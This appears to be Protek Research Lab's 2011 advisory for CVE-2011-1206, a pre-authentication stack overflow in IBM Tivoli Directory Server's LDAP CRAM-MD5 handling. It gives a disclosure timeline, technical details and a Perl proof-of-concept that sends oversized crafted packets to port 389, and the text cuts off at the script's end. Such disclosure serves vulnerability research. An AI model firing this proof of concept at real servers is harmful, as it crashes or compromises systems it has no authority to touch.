@@ -1,0 +1,228 @@
+Source: http://www.protekresearchlab.com/index.php?option=com_content&view=article&id=26&Itemid=26
+
+#####################################################################################
+
+Application:   IBM Tivoli Directory Server SASL Bind Request Remote Code Execution Vulnerability
+
+Platforms:   Windows
+
+Exploitation:   Remote code execution
+
+CVE Number:   CVE-2011-1206 
+
+ZDI number:   ZDI-11-136
+
+{PRL}:   2011-06
+
+Author:   Francis Provencher (Protek Research Lab's)
+
+WebSite:   http://www.protekresearchlab.com/
+
+Twitter:   @ProtekResearch
+
+
+#####################################################################################
+
+1) Introduction
+2) Report Timeline
+3) Technical details
+4) POC
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+IBM Tivoli Directory Server (ITDS), formerly known as IBM Directory Server,
+
+is an IBM implementation of the Lightweight Directory Access Protocol,
+
+and is part of the IBM Tivoli Identity & Access Management portfolio.
+
+IBM Tivoli Directory Server is a powerful, security-rich and standards-compliant
+
+enterprise directory for corporate intranets and the Internet. Directory Server is
+
+built to serve as the identity data foundation for rapid development and deployment
+
+of Web applications and security and identity management initiatives by including
+
+strong management, replication and security features.Several authentication methods
+
+are available with IBM Tivoli Directory Server, beyond basic usernames and passwords.
+
+ITDS supports digital certificate-based authentication, the Simple Authentication and
+
+Security Layer (SASL), Challenge-Response Authentication Mechanism MD5 (CRAM-MD5),
+
+and Kerberos authentication.IBM Tivoli Directory Server is a powerful LDAP
+
+infrastructure that provides a foundation for deploying comprehensive identity management
+
+applications and advanced software architectures.
+
+(http://en.wikipedia.org/wiki/IBM_Tivoli_Directory_Server)
+
+#####################################################################################
+
+============================
+2) Report Timeline
+============================
+
+2011-02-17 - Vulnerability reported to vendor
+2011-04-18 - Coordinated public release of advisory
+
+
+#####################################################################################
+
+====================
+3) Technical details
+====================
+
+This vulnerability allows remote attackers to execute arbitrary code on vulnerable
+
+installations of IBM Tivoli Directory Server. Authentication is not required to
+
+exploit this vulnerability. The specific flaw exists in how ibmslapd.exe handles
+
+LDAP CRAM-MD5 packets. ibmslapd.exe listens by default on port TCP 389. When the
+
+process receives an LDAP CRAM-MD5 packet, it uses libibmldap.dll to handle the
+
+allocation of a buffer for the packet data. A specially crafted packet can cause
+
+the ber_get_int function to allocate a buffer that is too small to fit the packet
+
+data, causing a subsequent stack-based buffer overflow. This can be leveraged by
+
+a remote attacker to execute arbitrary code under the context of the SYSTEM user.
+
+
+#####################################################################################
+
+===========
+4) POC
+===========
+
+#!/usr/bin/perl
+
+
+use strict;
+use warnings;
+
+use Getopt::Std;
+use IO::Socket::INET;
+
+$SIG{INT}  = \&abort;
+
+my $host  = '192.168.100.24';
+my $port  = 389;
+my $proto = 'tcp';
+my $sockType = SOCK_STREAM;
+my $timeout = 1;
+
+my %opt;
+my $opt_string = 'hH:P:t:';
+getopts( "$opt_string", \%opt );
+
+if (defined $opt{h}) {
+    usage()
+}
+
+$host    = $opt{H} ? $opt{H} : $host;
+$port    = $opt{P} ? $opt{P} : $port;
+$timeout = $opt{t} ? $opt{t} : $timeout;
+
+my @commands = (
+{Command => 'Send',
+ Data => "\x30\x18\x02\x01\x01\x60\x13\x02\x01\x03\x04\x00\xA3\x0C\x04\x08\x43\x52\x41\x4D\x2D\x4D\x44\x35\x04\x00"},
+{Command => 'Receive'},
+{Command => 'Send',
+ Data => "\x30\x82\x01\x41\x02\x01\x02\x60\x82\x01\x3A\x02\x01\x03\x04\x00\xA3\x82\x01\x31\x04\x08\x43\x52\x41\x4D\x2D\x4D\x44\x35\x04\x84\xFF\xFF\xFF\xFF\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x20\x36\x61\x37\x61\x31\x31\x34\x39\x36\x30\x33\x61\x64\x37\x64\x30\x33\x34\x39\x35\x66\x39\x65\x37\x31\x34\x66\x34\x30\x66\x31\x63"},
+{Command => 'Receive'},
+
+);
+
+
+my $sock = new IO::Socket::INET (	
+                PeerAddr => $host,
+				        PeerPort => $port, 
+				        Proto => $proto,
+                Type => $sockType,
+                Timeout => $timeout,
+            ) 
+    or die "socket error: $!\n\n";
+
+print "connected to: $host:$port\n";
+
+$sock->autoflush(1);
+binmode $sock;
+
+
+foreach my $command (@commands)
+{
+    if ($command->{'Command'} eq 'Receive')
+    {
+        my $buf = receive($sock, $timeout);
+        if (length $buf)
+        {
+            print "received: [$buf]\n";
+        }
+    }
+    elsif ($command->{'Command'} eq 'Send')
+    {
+        print "sending: [".$command->{'Data'}."]\n";
+        send ($sock, $command->{'Data'}, 0) or die "send failed, reason: $!\n";
+    }
+}
+
+close ($sock);
+
+
+sub receive
+{
+ my $sock = shift;
+ my $timeout = shift;
+
+ my $tmpbuf;
+ my $buf = "";
+
+ while(1)
+ { 
+  eval {
+    local $SIG{ALRM} = sub { die "timeout\n" };
+    alarm $timeout;
+
+    my $ret = read $sock, $tmpbuf, 1; 
+    if ( !defined $ret or $ret == 0 )
+    { 
+        die "timeout\n";
+    }
+
+    alarm 0;
+    $buf .= $tmpbuf;
+  };
+  if ($@) { 
+    if($@ eq "timeout\n")
+    {
+        last;
+    }
+    else {
+        die "receive aborted\n";
+    }
+  }
+ } 
+ return $buf;
+}
+
+sub abort
+{
+ print "...\n";
+ if ($sock)
+ {
+  close $sock;
+ }
+ die "...\n";
+}
+sub usage
